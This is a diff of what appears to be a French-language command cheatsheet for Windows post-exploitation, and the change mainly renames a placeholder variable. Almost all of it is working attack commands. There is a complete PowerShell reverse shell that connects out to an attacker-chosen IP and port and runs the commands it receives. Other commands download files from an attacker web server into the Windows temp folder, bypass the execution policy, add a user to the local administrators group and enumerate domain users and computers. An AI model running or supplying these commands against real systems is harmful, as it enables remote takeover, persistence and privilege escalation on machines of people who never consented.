@@ -1,68 +1,67 @@
 % download, windows, powershell
 
 # Télécharger le fichier depuis un serveur web
-run <TYPE> powershell -c "Invoke-WebRequest -Uri 'http://<IP>:<PORT>/<FILE>' -OutFile '<DIRECTORY_OUT>\<FILE>'"
+run <ACTION_CMD> powershell -c "Invoke-WebRequest -Uri 'http://<IP>:<PORT>/<FILE>' -OutFile '<DIRECTORY_OUT>\<FILE>'"
 
 # Télécharger le fichier depuis un serveur web
-run <TYPE> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP>:<PORT>/<FILE>')"
+run <ACTION_CMD> powershell "(New-Object System.Net.WebClient).Downloadfile('http://<IP>:<PORT>/<FILE>')"
 
 $ IP: ip -4 addr | grep -oP '(?<=inet\s)\d+(\.\d+){3}'
 $ PORT: echo "21,22,80,443,1234,4444" | tr ',' '\n'
 $ FILE: echo "file.sh,file.exe,file.php,file.bat" | tr ',' '\n'
 $ DIRECTORY_OUT: echo "c:\windows\temp," | tr ',' '\n'
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
 
 
 % windows, service
 
 # Gérer les services windows
-run <TYPE> sc <ETAT> <SERVICE>
+run <ACTION_CMD> sc <ETAT> <SERVICE>
 
 # Afficher les services en cours
-run <TYPE> powershell -c "Get-Service"
+run <ACTION_CMD> powershell -c "Get-Service"
 
 $ ETAT: echo "start,stop,query" | tr ',' '\n'
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
 
 
 % windows, processus
 
 # Démarrer un processus
-run <TYPE> Start-Process <PROCESSUS>
+run <ACTION_CMD> Start-Process <PROCESSUS>
 
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
-
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
 
 % windows, reverse, shell
 
 # Reverse shell powershell
-run <TYPE> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+run <ACTION_CMD> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<IP>',<PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
 
 # Charger powershell avec Policy Execution bypass (Permet d'exécuter le script PowerView.ps1)
-run <TYPE> powershell -ep bypass
+run <ACTION_CMD> powershell -ep bypass
 
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
 
 
 % windows, add, user, group, computer
 
 # Ajouter un nouvel utilisateur à windows
-run <TYPE> net user <USERNAME> <PASSWORD> /add
+run <ACTION_CMD> net user <USERNAME> <PASSWORD> /add
 
 # Ajouter l'utilisateur au groupe admin
-run <TYPE> net localgroup administrators <USERNAME> /add
+run <ACTION_CMD> net localgroup administrators <USERNAME> /add
 
 # Lister les utilisateurs du domaine
-run <TYPE> powershell -c "Get-NetUser | select cn"
+run <ACTION_CMD> powershell -c "Get-NetUser | select cn"
 
 # Lister tous les groupes
-run <TYPE> powershell -c "Get-NetGroup"
+run <ACTION_CMD> powershell -c "Get-NetGroup"
 
 # Lister les os du domaine
-run <TYPE> powershell -c "Get-NetComputer -fulldata | select operatingsystem"
+run <ACTION_CMD> powershell -c "Get-NetComputer -fulldata | select operatingsystem"
 
 # Afficher toutes les propriétés d'un utilisateur
-run <TYPE> powershell -c "Get-ADUser -Identity <USER> -Properties *"
+run <ACTION_CMD> powershell -c "Get-ADUser -Identity <USER> -Properties *"
 
 $ USER: echo "Administrateur,Administrator" | tr ',' '\n'
-$ TYPE: echo "all,copy,view,exec" | tr ',' '\n'
+$ ACTION_CMD: echo "exec,view" | tr ',' '\n'
